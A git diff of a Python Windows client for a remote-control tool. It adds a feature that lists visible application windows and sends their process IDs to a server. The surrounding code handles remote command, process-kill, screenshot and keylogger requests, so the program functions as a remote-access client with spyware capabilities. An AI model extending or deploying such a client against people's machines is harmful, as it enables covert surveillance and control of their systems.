@@ -8,6 +8,8 @@ import threading
 import subprocess
 from winreg import *
 from tempfile import NamedTemporaryFile
+import win32gui
+import win32process
 
 
 SERVER = ""
@@ -110,6 +112,8 @@ class Client:
                     self.getKillProcess()
                 elif flag == 'startprocess':
                     self.getStartProcess()
+                elif flag == 'applist':
+                    self.sendAppList()
                 elif flag == 'command':
                     self.getCommand()
                 elif flag == 'keylogger':
@@ -176,6 +180,7 @@ class Client:
 
         return result
 
+
     #  screenshot func
     def sendScreenshot(self):
         print(f'{self.addr} \tSEND SCREENSHOT')
@@ -186,6 +191,7 @@ class Client:
             print(f'{self.addr} \tError: Unable to take screenshot')
         
         self.sendDump(image)
+
 
     # process list func
     def sendProcessList(self):
@@ -229,6 +235,29 @@ class Client:
             self.buff.send('ER'.encode() + self.DELIM)
         else:
             self.buff.send('OK'.encode() + self.DELIM)
+
+    
+    #send app list
+    def sendAppList(self):
+        def getAllWindows(hwnd, result):
+            name = win32gui.GetWindowText(hwnd)
+            isVisible = win32gui.IsWindowVisible(hwnd)
+            nID = win32process.GetWindowThreadProcessId(hwnd)
+
+            if name != '' and isVisible:
+                result.append(nID[1])
+            return True
+
+        print(f'{self.addr} \tSEND APP LIST')
+        try:
+            result = []
+            win32gui.EnumWindows(getAllWindows, result)
+        except:
+            result = None
+            print(f'{self.addr} \tError: Unable to get app list')
+        
+        self.sendDump(result)
+
 
     # keylogger func
     def keylogger_Server(self):
